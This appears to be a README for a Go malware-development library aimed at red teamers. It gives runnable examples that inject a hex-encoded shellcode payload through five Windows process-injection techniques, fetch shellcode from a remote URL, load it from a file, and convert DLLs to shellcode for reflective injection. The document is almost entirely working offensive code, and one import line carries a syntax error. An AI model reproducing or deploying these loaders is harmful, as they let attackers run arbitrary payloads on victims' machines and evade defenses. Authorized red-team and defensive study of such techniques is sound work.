# Shellcode Examples

- This package provides useful functions to help red teamers with shellcode injection

\* Have in mind that a lot of errors have not been handled in shellcode injection techniques because they usually throws false errors. However it should work as expected

## All Shellcode Injection Techniques

```go
package main

import (
  "log"
  "encoding/hex"

  "github.com/D3Ext/maldev/shellcode"
)

func main(){
  calc_shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

  err := shellcode.CreateProcess(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }

  err = shellcode.EarlyBirdApc(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }

  err = shellcode.UuidFromStringA(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }

  err = shellcode.Fibers(calc_shellcode) // This technique doesn't exit until process ends
  if err != nil {
    log.Fatal(err)
  }

  err = shellcode.CreateRemoteThread(calc_shellcode) // This technique doesn't exit until process ends
  if err != nil {
    log.Fatal(err)
  }
}
```

## Get shellcode from file

```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/maldev/shellcode"
)

func main(){
  shellcode_to_exec, err := shellcode.GetShellcodeFromFile("./shellcode.bin") // func GetShellcodeFromFile(filename string) ([]byte, error) {}
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(shellcode_to_exec)
}
```

## Get shellcode from remote url

```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/maldev/shellcode"
)

func main(){
  shellcode_to_exec, err := shellcode.GetShellcodeFromUrl("http://192.168.1.6/shellcode.bin") // func GetShellcodeFromUrl(url string) ([]byte, error) {}
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(shellcode_to_exec)
}
```

## Convert DLL to shellcode

- This function is really useful to perform a ***sRDI*** **(shellcode Reflective DLL Injection)**. It autodetects between x86 and x64 architecture

```go
package main

import (
  "fmt
  "log"

  "github.com/D3Ext/maldev/shellcode"
)

func main(){
  sc, err := shellcode.ConvertDllToShellcode("example.dll", "functionName", "") // func ConvertDllToShellcode(dll_file string, function_name string, args string) ([]byte, error) {}
  if err != nil {
    log.Fatal(err)
  }
  
  fmt.Println(sc)
}
```



